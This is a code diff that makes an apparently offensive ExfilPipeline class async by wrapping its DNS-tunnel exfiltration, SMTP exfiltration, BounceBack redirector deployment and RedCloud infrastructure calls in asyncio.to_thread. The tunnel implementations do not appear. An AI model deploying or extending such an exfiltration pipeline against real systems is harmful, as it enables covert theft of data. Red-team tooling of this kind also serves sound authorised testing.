@@ -1,5 +1,5 @@
 from __future__ import annotations
-import asyncio, os
+import asyncio, os, functools
 from typing import TYPE_CHECKING, Optional
 if TYPE_CHECKING:
     from ..runtime.session_manager import SandboxSession
@@ -44,7 +44,8 @@ class ExfilPipeline:
         results["sandboxed"] = sandbox_active
 
         if use_skills and not sandbox_active:
-            skill_result = self.skills.execute_skill(
+            skill_result = await asyncio.to_thread(
+                self.skills.execute_skill,
                 "detecting-data-exfiltration-indicators",
                 [data[:100]],
             )
@@ -96,7 +97,7 @@ class ExfilPipeline:
             if method == "dns" or method == "all":
                 if self.dns_domain:
                     tunnel = DNSTunnel(self.dns_domain, self.dns_server)
-                    results["components"]["dns"] = tunnel.exfil(data)
+                    results["components"]["dns"] = await asyncio.to_thread(tunnel.exfil, data)
                 else:
                     results["components"]["dns"] = {"error": "no dns_domain specified"}
 
@@ -105,7 +106,7 @@ class ExfilPipeline:
                     tunnel = SMTPTunnel(self.smtp_server, self.smtp_port,
                                         self.smtp_user, self.smtp_pass, self.smtp_tls)
                     rcpt = recipient or "exfil@localhost"
-                    results["components"]["smtp"] = tunnel.exfil(data, rcpt)
+                    results["components"]["smtp"] = await asyncio.to_thread(tunnel.exfil, data, rcpt)
                 else:
                     results["components"]["smtp"] = {"error": "no smtp_server specified"}
 
@@ -119,17 +120,16 @@ class ExfilPipeline:
             if method == "redirector" or method == "all":
                 bb = BounceBack()
                 if forward_host:
-                    results["components"]["bounceback"] = bb.deploy(
-                        listen_port=8443,
-                        forward_host=forward_host,
-                        forward_port=forward_port,
+                    results["components"]["bounceback"] = await asyncio.to_thread(
+                        bb.deploy, listen_port=8443,
+                        forward_host=forward_host, forward_port=forward_port,
                     )
                 else:
-                    results["components"]["bounceback"] = bb.status()
+                    results["components"]["bounceback"] = await asyncio.to_thread(bb.status)
 
             if method == "infra" or method == "all":
                 rc = RedcloudDeploy()
-                results["components"]["redcloud"] = rc.deploy(profile=redcloud_profile)
+                results["components"]["redcloud"] = await asyncio.to_thread(rc.deploy, profile=redcloud_profile)
 
             results["summary"] = {
                 "dns_available": bool(self.dns_domain),
